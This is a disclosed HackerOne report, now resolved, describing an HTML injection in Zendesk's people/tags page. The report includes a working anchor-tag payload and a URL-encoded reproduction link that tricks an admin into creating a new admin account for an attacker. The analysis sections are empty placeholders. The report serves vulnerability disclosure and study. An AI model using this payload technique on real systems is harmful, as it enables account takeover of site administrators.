---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '111915'
original_report_id: '111915'
title: '[CRITICAL] HTML injection issue leading to account take over'
weakness: Cross-site Scripting (XSS) - Generic
team_handle: zendesk
created_at: '2016-01-20T20:17:26.987Z'
disclosed_at: '2016-04-04T21:48:49.506Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 3
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# [CRITICAL] HTML injection issue leading to account take over

## Metadata

- HackerOne Report ID: 111915
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: zendesk
- Disclosed At: 2016-04-04T21:48:49.506Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hi , I have found an HTML injection issue in `https://<subdomain>.zendesk.com/people/tags` that could lead to account take over. 
I can't get malicious scripts executed , but an attacker can take over the admin's account by injecting the following HTML code.
```html
<h1><a href="/users?user[name]=Hacker&user[agent_display_name]=Hacker&user[email]=hacker@domain.com&user[restriction_id]=4&user[roles]=2" data-method=post>CLICK HERE</a></h1>
```
the `data-method` attribute is not removed from the `<a>` tag , so when the admin clicks on `Click Here` a new user with the name `Hacker` and the email `hacker@domain.com` will be added.

#Steps to reproduce:
- Login with an admin account then go to: 

`https://<subdomain>.zendesk.com/people/tags/<h1><a%20href%3D"%2Fusers%3Fuser%5Bname%5D%3DHacker%26user%5Bagent_display_name%5D%3DHacker%26user%5Bemail%5D%3Dhacker%40domain.com%26user%5Brestriction_id%5D%3D4%26user%5Broles%5D%3D2"%20data-method%3Dpost>CLICK%20HERE NOW<%2Fa><%2Fh1><img src=x width=1 height=9999999999>/destroy`

You'll see a link saying `Click here now` click that link and a new admin with the email `hacker@domain.com` will be added.

Thanks

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
